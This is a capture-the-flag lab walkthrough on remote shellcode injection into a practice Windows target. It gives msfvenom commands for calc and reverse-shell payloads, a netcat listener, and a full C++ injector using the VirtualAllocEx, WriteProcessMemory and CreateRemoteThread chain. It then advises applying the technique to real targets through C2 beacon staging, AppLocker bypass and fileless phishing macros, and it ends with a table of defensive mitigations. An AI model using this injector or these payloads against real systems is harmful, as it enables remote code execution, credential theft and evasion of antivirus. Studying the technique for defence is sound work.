# #20 — Remote Shellcode Injection

**Difficulty:** MEDIUM — the Windows API chain is the same as #13, but you need Kali + msfvenom.

## What is this attack?

**Fileless cousin of #13.** You skip the DLL entirely and inject raw machine code (shellcode) into the target process. The shellcode runs inside the target — launches calc, opens a reverse shell, drops Meterpreter, whatever your msfvenom command produced.

If #13 is "shove a DLL into a process", #20 is "shove the machine code directly, no DLL needed."

## Why it works

Exactly the same four Windows APIs as #13 (`OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`) — but with **two critical changes**:

| | #13 (DLL) | #20 (shellcode) |
|---|---|---|
| What you write via `WriteProcessMemory` | DLL path string (~50 B) | Raw shellcode bytes (~200 B – 2 KB) |
| Memory protection on alloc | `PAGE_READWRITE` (just data) | **`PAGE_EXECUTE_READWRITE`** (code pages) |
| `CreateRemoteThread` entry point | `kernel32!LoadLibraryA` with path as arg | **The shellcode's own address** |

That's it. Same chain, different payload type.

### Why this bypasses more defenses

- **No DLL file on disk** → file-based antivirus has nothing to scan
- **No `LoadLibraryA` call on target** → no ETW `Microsoft-Windows-Kernel-ImageLoad` event
- **No entry in PEB module list** → `GetModuleHandle("your_dll")` returns NULL, invisible to inventory
- **No `LDR_DATA_TABLE_ENTRY`** → tools walking the loader list can't find you

## When attackers use this

**This is the most common process injection technique in the wild.** More than all 7 original MVTC techniques combined:

- Cobalt Strike's beacon staging
- Metasploit's `windows/exec` and `windows/meterpreter` payloads
- Sliver, Mythic, Havoc, Nighthawk — all C2 frameworks
- Every ransomware family's initial-access loader
- Nearly every APT41, APT28, FIN7 implant chain

If you see "process injection" on a MITRE ATT&CK threat report, 70% of the time it's this.

## Tools you need

| Tool | Why | Where |
|---|---|---|
| Visual Studio 2022 Build Tools (MSVC v143) | Compile the injector | `winget install Microsoft.VisualStudio.2022.BuildTools` |
| **Kali Linux (or any Metasploit install)** | Generate shellcode via msfvenom | https://www.kali.org/get-kali/ |
| netcat (`nc`) | Listener for reverse shell variant | Kali ships with it; on Windows use `ncat` from Nmap |
| Target running | MVTC.exe (or any x64 app) | — |

## Two variants demonstrated

### Variant A — Pop calc.exe (quick proof)

Lightweight. Spawns `calc.exe` as a child of the target. Zero post-exploitation; just proof of code exec.

### Variant B — Reverse shell (real impact)

Shellcode calls back to your Kali box. You get an interactive `cmd.exe` running as the target user with full RWX access to the target's memory. From there you can pivot, dump creds, read in-memory secrets.

## Step-by-step

### Step 1 — Generate shellcode

**Variant A (pop calc):**

```bash
msfvenom -p windows/x64/exec \
         CMD=calc.exe \
         EXITFUNC=thread \
         -f c -v shellcode
```

`EXITFUNC=thread` is **critical**. The default (`EXITFUNC=process`) exits the whole target process when the shellcode finishes — which crashes MVTC. `thread` only exits the injected thread, leaving MVTC running.

Output looks like:

```
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
...
```

Copy that whole array.

**Variant B (reverse shell):**

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
         LHOST=10.0.0.5 LPORT=4444 \
         EXITFUNC=thread \
         -f c -v shellcode
```

Replace `LHOST=10.0.0.5` with YOUR Kali IP (`ip -4 a | grep inet`). Keep `LPORT=4444` or pick any unused port.

### Step 2 — Attacker listener (Variant B only)

**On Kali, before injecting:**

```bash
nc -lvnp 4444
```

Keep it running. It'll block waiting for the connect-back.

### Step 3 — Write the injector

Save as `sc_injector.cpp`. Paste YOUR msfvenom output into the `shellcode[]` array:

```cpp
// sc_injector.cpp — REMOTE shellcode injection
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// === PASTE MSFVENOM OUTPUT HERE ===
unsigned char shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    // ... hundreds more bytes from msfvenom ...
    "\xc3";
// === END PASTE ===

int main(int argc, char** argv) {
    if (argc != 2) { printf("Usage: %s <PID>\n", argv[0]); return 1; }
    DWORD pid = atoi(argv[1]);
    SIZE_T scLen = sizeof(shellcode) - 1;

    printf("[*] target PID: %lu\n", pid);
    printf("[*] shellcode : %zu bytes\n", scLen);

    // 1. OpenProcess
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { printf("[!] OpenProcess %lu\n", GetLastError()); return 2; }
    printf("[+] OpenProcess OK\n");

    // 2. Allocate RWX in target
    //    NOTE: PAGE_EXECUTE_READWRITE here is the big red flag EDR looks for.
    //    Stealthier: PAGE_READWRITE then WriteProcessMemory then
    //    VirtualProtectEx to PAGE_EXECUTE_READ ("W^X dance").
    LPVOID buf = VirtualAllocEx(hProc, nullptr, scLen,
                                MEM_COMMIT | MEM_RESERVE,
                                PAGE_EXECUTE_READWRITE);
    if (!buf) { printf("[!] VirtualAllocEx %lu\n", GetLastError()); return 3; }
    printf("[+] VirtualAllocEx @ %p (%zu bytes RWX)\n", buf, scLen);

    // 3. Write shellcode bytes
    SIZE_T written = 0;
    WriteProcessMemory(hProc, buf, shellcode, scLen, &written);
    printf("[+] wrote %zu bytes\n", written);

    // 4. CreateRemoteThread → shellcode is the entry point
    HANDLE hT = CreateRemoteThread(hProc, nullptr, 0,
        (LPTHREAD_START_ROUTINE)buf, nullptr, 0, nullptr);
    if (!hT) { printf("[!] CreateRemoteThread %lu\n", GetLastError()); return 5; }
    printf("[+] CreateRemoteThread fired - shellcode running INSIDE PID %lu\n", pid);

    WaitForSingleObject(hT, 5000);
    CloseHandle(hT);
    // Don't VirtualFreeEx buf if shellcode may still be executing (reverse shell).
    CloseHandle(hProc);
    return 0;
}
```

### Step 4 — Build

```bash
cl /EHsc /O2 /nologo sc_injector.cpp /link /OUT:sc_injector.exe
```

### Step 5 — Find the MVTC PID

```powershell
Get-Process -Name MVTC | Select Id, ProcessName
```

### Step 6 — Inject

```bash
sc_injector.exe <MVTC_PID>
```

### Step 7 — Verify

**Variant A (calc):** Open Process Hacker, find MVTC.exe, look at its children. `calc.exe` should appear as a direct child.

**Variant B (reverse shell):** Your Kali listener prints:

```
connect to [10.0.0.5] from (UNKNOWN) [10.0.0.X] 51234
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.

C:\Users\admin>
```

You now have an interactive cmd.exe running inside MVTC.

### Step 8 — Capture the flag (Variant B)

In your reverse shell, drop into PowerShell and read `InjectionSentinels._sc` via reflection:

```powershell
powershell -NoProfile -Command @'
$t = [AppDomain]::CurrentDomain.GetAssemblies() |
     ForEach-Object { try { $_.GetTypes() } catch {} } |
     Where-Object { $_.Name -eq "InjectionSentinels" } |
     Select-Object -First 1
if ($t) {
    $f = $t.GetField("_sc", "NonPublic,Static")
    "FLAG: $($f.GetValue($null))"
}
'@
```

Output:

```
FLAG: MVTC{v20_sc_████████████████████}
```

## How to apply this to a real target

### Modern C2 beacon drop

Cobalt Strike beacons ship as either:
- A reflective DLL (we did that in #16), or
- Position-independent **shellcode** (this)

Red-team playbook: generate a stager with `windows/x64/meterpreter_reverse_tcp` or Cobalt's `beacon_x64`, inject into any user-mode process the user logs into (OneDrive, Outlook, Teams), get persistence via `winlogon`-level injection, pivot.

### Exec policy bypass

Target has AppLocker in Deny mode for `.exe` and `.dll` outside Program Files? Shellcode has no file — it bypasses AppLocker entirely because AppLocker's model doesn't inspect memory.

### Fileless phishing payload

Malicious macro in a Word doc: the macro contains the shellcode inline + calls `VirtualAlloc`/`CreateThread`/write the pattern. Nothing writes to disk. Nothing to scan with AV.

## How defenders fix this

| Mitigation | Effect |
|---|---|
| **`SetProcessMitigationPolicy(ProcessDynamicCodePolicy)`** | Blocks `VirtualAllocEx` with `PAGE_EXECUTE_READWRITE` from unsigned callers |
| **Code Integrity Guard (CIG)** | No non-Microsoft-signed binaries can allocate executable pages |
| **Arbitrary Code Guard (ACG)** | No RWX pages at all; no R → RX protection changes |
| **ETW `Microsoft-Windows-Threat-Intelligence`** | Reports RWX allocations with no backing image |
| **PsSetCreateThreadNotifyRoutine kernel callback** | EDR driver sees `CreateRemoteThread` with entry address not inside any mapped image → high-confidence detection |
| **AMSI for scripts** | Blocks the reverse shell's PowerShell reflection step |

The strongest single setting is **`ProcessDynamicCodePolicy`**. It kills #20 outright — your `VirtualAllocEx(RWX)` returns NULL. Most apps don't enable it because it breaks JIT compilers; worth it for an app that doesn't need JIT.

## Flag captured

```
MVTC{v20_sc_████████████████████}
```

---

## Summary — where #20 fits in the taxonomy

Updated noise/evasion matrix (now 8 injection techniques covered):

```
            new thread?  LoadLibrary?  file on disk?  DLL in PEB?
#13 CRT      YES          YES           YES            YES
#14 APC      no           YES           YES            YES
#15 hollow   no (hijack)  YES           YES            YES
#17 .NET     no (CLR)     no            may            MANAGED
#16 reflect  no (RWX)     NO            NO             NO
#18 hijack   no           YES           YES            YES
#20 sc       YES          NO            NO             NO    ← fileless
#19 debug    n/a          n/a           n/a            n/a
```

#20 and #16 are the two "stealth tier" entries. #20 is simpler to implement (no PE parsing); #16 is harder to detect in modern EDRs because there's no new thread.

For a real engagement, you'd pick #20 for speed and #16 for stealth. For a learning path, do #13 → #20 first (same chain, one changes), then tackle #16.
